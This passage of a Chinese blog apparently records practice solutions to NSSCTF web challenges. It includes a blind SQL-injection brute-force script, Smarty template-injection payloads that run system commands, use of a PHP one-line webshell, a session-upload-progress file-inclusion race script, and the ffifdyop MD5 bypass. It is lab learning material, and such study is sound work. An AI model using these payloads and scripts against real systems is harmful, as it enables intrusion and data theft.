&#x27;admin&#x27;) &#123;</span><br><span class="line">        alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    if (!$row) &#123;</span><br><span class="line">        alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">        die($FLAG);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  die;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;/index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;账号&quot;&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; / value=&quot;登录&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>好了，那么对于代码进行一个审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="comment">#首先username必须是admin</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);        <span class="comment">#配合上面的checkSql对传入的password进行一个检测，不能符合正则的检测</span></span><br><span class="line">    <span class="comment">#一个sql查询语句，带入数据库进行查询</span></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment"># 最后当我们输入的 password 等于 $password 输出flag</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接嗦一个脚本用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line">alp = <span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pass</span>():</span><br><span class="line">    url = <span class="string">&quot;http://1.14.71.254:28610/index.php&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> alp:</span><br><span class="line">            data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag+i&#125;</span>%&#x27;#&quot;</span>&#125;</span><br><span class="line">            resp = requests.post(url=url,data=data)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                flag+=i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;~&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">get_pass()</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dyet_another_mysql_injection%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>密码已经跑出来了，直接进行上传拿到flag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5Dyet_another_mysql_injection%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<h2 id="HNCTF-2022-Week1-easy-html"><a href="#HNCTF-2022-Week1-easy-html" class="headerlink" title="[HNCTF 2022 Week1]easy_html"></a>[HNCTF 2022 Week1]easy_html</h2><p>这道题算是个签到题吧，但是有对于我修改其母代码固性思维的挑战，所以就写一下</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目一进去就这么一句话，而且F12或访问常见文件什么都没有，所以看看请求头</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现在cookie里有奇怪的文件，注意解析，解析之后是&#x2F;f14g.php，尝试访问</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>尝试输入电话号码，发现输入到第10位的时候就无法再输入了，修改对此进行限制的前端代码</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>只要大于电话号码的位数即可，输入并登录就拿到flag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHNCTF%202022%20Week1%5Deasy_html%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<h2 id="HDCTF-2023-SearchMaster"><a href="#HDCTF-2023-SearchMaster" class="headerlink" title="[HDCTF 2023]SearchMaster"></a>[HDCTF 2023]SearchMaster</h2><p>题目有进去就是一个很普通的界面，点进去是一个人的博客，找了找还以为有flag，但是没有，用diresearch扫了一下，发现了这个</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;smarty/smarty&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;library&quot;,</span><br><span class="line">    &quot;description&quot;: &quot;Smarty - the compiling PHP template engine&quot;,</span><br><span class="line">    &quot;keywords&quot;: [</span><br><span class="line">        &quot;templating&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;homepage&quot;: &quot;https://smarty-php.github.io/smarty/&quot;,</span><br><span class="line">    &quot;license&quot;: &quot;LGPL-3.0&quot;,</span><br><span class="line">    &quot;authors&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Monte Ohrt&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;monte@ohrt.com&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Uwe Tews&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;uwe.tews@googlemail.com&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Rodney Rehm&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;rodney.rehm@medialize.de&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Simon Wisselink&quot;,</span><br><span class="line">            &quot;homepage&quot;: &quot;https://www.iwink.nl/&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;support&quot;: &#123;</span><br><span class="line">        &quot;issues&quot;: &quot;https://github.com/smarty-php/smarty/issues&quot;,</span><br><span class="line">        &quot;forum&quot;: &quot;https://github.com/smarty-php/smarty/discussions&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;php&quot;: &quot;^7.1 || ^8.0&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;autoload&quot;: &#123;</span><br><span class="line">        &quot;classmap&quot;: [</span><br><span class="line">            &quot;libs/&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;extra&quot;: &#123;</span><br><span class="line">        &quot;branch-alias&quot;: &#123;</span><br><span class="line">            &quot;dev-master&quot;: &quot;4.0.x-dev&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;require-dev&quot;: &#123;</span><br><span class="line">        &quot;phpunit/phpunit&quot;: &quot;^8.5 || ^7.5&quot;,</span><br><span class="line">        &quot;smarty/smarty-lexer&quot;: &quot;^3.1&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出来是samrty模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=a&#123;*comment*&#125;b</span><br></pre></td></tr></table></figure>

<p>当我们使用post在第一个界面发送时，界面上出现了ab，这也验证了确实是smarty模板</p>
<p>这里我们就尝试使用各种标签来进行命令执行，最后发现if标签可以成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if system(&#x27;ls /f*&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>推测这是flag所在的文件名字，进行查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if system(&#x27;cat /flag_13_searchmaster&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BHDCTF%202023%5DSearchMaster%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>成功拿到flag</p>
<h2 id="羊城杯-2020-easycon"><a href="#羊城杯-2020-easycon" class="headerlink" title="[羊城杯 2020]easycon"></a>[羊城杯 2020]easycon</h2><p>使用diresearch扫描题目网址，发现Index.html，index.php，index.php&#x2F;login，挨着访问，发现inde.php下面出现了弹窗</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>这不是一句话木马的内容嘛，尝试用蚁剑连接</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>蚁剑连接后在html文件夹下发现好几个文件，依次点开在txt文件里发现了许多很像base64的码，但是解码失败，会不会是base64转其他格式的文件？推荐一个网站</p>
<p><a target="_blank" rel="noopener" href="https://onlinetools.com/image/">https://onlinetools.com/image/</a></p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasycon%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>得到flag，改一下前缀就行</p>
<h2 id="第五空间-2021-EasyCleanup"><a href="#第五空间-2021-EasyCleanup" class="headerlink" title="[第五空间 2021]EasyCleanup"></a>[第五空间 2021]EasyCleanup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果有设置?shell，则?shell的值为其设置的值；若没有设置，则?shell&#x3D;phpinfo();</p>
<p>审计源码，很明显这里直接命令执行应该是无法执行的：</p>
<p>总长度不能大于等于15<br>数字和字母的字符次数不能大于等于8次<br>加上一些filter()的过滤，这里基本无法实现?shell的命令执行</p>
<p>关键在include $_GET[‘file’];，有文件包含，虽然有filter()和长度的限制，但是没有最恶心的CheckNums()；加上给了我们一个phpinfo。查看一下session.upload_progress，默认都是开启的。并且这里记录上传进度的session文件都没有开启自动清除(session.upload_progress.cleanup&#x3D;&#x3D;Off)，条件竞争都不用做了。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5DEasyCleanup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>没有给出<code>session.save_path</code>，那sesion应该就是默认保存位置：&#x2F;tmp&#x2F;sess_xxx，但是没有脚本，所以就去网上剽窃了一个</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">myurl = <span class="string">&#x27;http://114.115.134.72:32770/index.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">myfile = io.BytesIO(<span class="string">b&#x27;mochu7&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">writedata = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls -lha /&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeshell</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = requests.post(url=myurl, data=writedata, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;mochu7.txt&#x27;</span>, myfile)&#125;, cookies=mycookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload_url = myurl + <span class="string">&#x27;?file=&#x27;</span> + <span class="string">&#x27;/tmp/sess_&#x27;</span> +sessid</span><br><span class="line">        resp = requests.get(url=payload_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;upload_progress&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    writeshell = threading.Thread(target=writeshell, args=(session,))</span><br><span class="line">    writeshell.daemon = <span class="literal">True</span></span><br><span class="line">    writeshell.start()</span><br><span class="line">    getshell(session)</span><br></pre></td></tr></table></figure>

<p>直接跑脚本</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021%5DEasyCleanup%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>得到flag。</p>
<h2 id="SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]奇妙的MD5"></a>[SWPUCTF 2022 新生赛]奇妙的MD5</h2><p>这道题其实很简单，但是设计到一个之前不知道的知识点：</p>
<p>进入页面，发现没什么有用的，拉进火狐看看请求包</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5D%E5%A5%87%E5%A6%99%E7%9A%84MD5%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>发现了hint:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>

<p>这个东西可以用万能绕过字符：ffifdyop绕过，在跳转后的页面里按f12，查看得到源代码</p>
